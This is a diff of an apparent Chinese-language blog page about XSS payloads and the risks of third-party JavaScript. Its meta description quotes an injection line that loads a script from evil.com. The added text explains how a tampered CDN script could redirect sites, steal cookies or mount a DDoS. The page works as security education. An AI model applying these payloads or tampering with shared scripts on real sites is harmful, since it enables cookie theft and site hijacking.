@@ -100,7 +100,7 @@
 <meta property="og:url" content="http://Merl1ng.com/2017/07/24/xss所加载的脚本/index.html">
 <meta property="og:site_name" content="Merl1ng">
 <meta property="og:description" content="XSS Payload实际上就是javascript脚本（也可以是其他富客户端脚本） 加载远程脚本(常见)XSS 获取浏览器 Cookie对象攻击者先加载一个远程脚本js http://www.a.com/test.htm?abc=&amp;quot;&amp;gt;&amp;lt;script src=http://www.evil.com/evil.js&amp;gt;&amp;lt;/script&amp;gt;真正的XSS Payloa">
-<meta property="og:updated_time" content="2017-07-25T06:09:27.976Z">
+<meta property="og:updated_time" content="2017-07-27T06:55:37.676Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="xss所加载的脚本">
 <meta name="twitter:description" content="XSS Payload实际上就是javascript脚本（也可以是其他富客户端脚本） 加载远程脚本(常见)XSS 获取浏览器 Cookie对象攻击者先加载一个远程脚本js http://www.a.com/test.htm?abc=&amp;quot;&amp;gt;&amp;lt;script src=http://www.evil.com/evil.js&amp;gt;&amp;lt;/script&amp;gt;真正的XSS Payloa">
@@ -364,6 +364,9 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span>(var i=0,tags=document.querySelectorAll(<span class="string">'iframe[src],frame[src],script[src],link[rel=stylesheet],object[data],embed[src]'</span>),tag;tag=tags[i];i++)&#123;</div><div class="line">  var a = document.createElement(<span class="string">'a'</span>);</div><div class="line">  a.href = tag.src||tag.href||tag.data;</div><div class="line">  <span class="keyword">if</span>(a.hostname!=location.hostname)&#123;</div><div class="line">    console.warn(location.hostname+<span class="string">' 发现第三方资源['</span>+tag.localName+<span class="string">']:'</span>+a.href);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>（这段代码实际可以找出J/C）<br>将该段代码输入在控制台内 回车<br>比如在<code>www.CUC.com</code>内输入显示发现第三方资源<br><code>http://www.qaq.pw/1.js</code></p>
 <p>渗透<code>http://www.qaq.pw/1.js</code><br>在1.js下重写js 即XSS Payload</p>
+<p>当然 如果这个js是你自己写的就更加方便</p>
+<h4 id="外源JS"><a href="#外源JS" class="headerlink" title="外源JS"></a>外源JS</h4><p>现在的Web应用或多或少会使用一些外源的    JS，但这里面可能存在安全隐患。如果你自己编写了一个JS文件，提供了一些功能，并且把它放到了CDN上给别人用 你就可以修改它的内容所有使用它的站点都会受到影响</p>
+<p>比如，你可以插入一个location.href的赋值来劫持站点，或者插入XSS平台的Payload来获取用户Cookie再或者插入一个对资源的访问来DDoS该站点。这种情况下，你可以让这些站点来帮你执行任何代码</p>
 
       
     </div>
@@ -568,7 +571,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#加载远程脚本-常见"><span class="nav-number">1.</span> <span class="nav-text">加载远程脚本(常见)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS-获取浏览器-Cookie对象"><span class="nav-number">1.1.</span> <span class="nav-text">XSS 获取浏览器 Cookie对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用XSS删除文章"><span class="nav-number">1.2.</span> <span class="nav-text">利用XSS删除文章</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#加载目标网站上不是该站的脚本"><span class="nav-number">2.</span> <span class="nav-text">加载目标网站上不是该站的脚本</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#加载远程脚本-常见"><span class="nav-number">1.</span> <span class="nav-text">加载远程脚本(常见)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS-获取浏览器-Cookie对象"><span class="nav-number">1.1.</span> <span class="nav-text">XSS 获取浏览器 Cookie对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用XSS删除文章"><span class="nav-number">1.2.</span> <span class="nav-text">利用XSS删除文章</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#加载目标网站上不是该站的脚本"><span class="nav-number">2.</span> <span class="nav-text">加载目标网站上不是该站的脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#外源JS"><span class="nav-number">2.1.</span> <span class="nav-text">外源JS</span></a></li></ol></li></ol></div>
             
 
           </div>
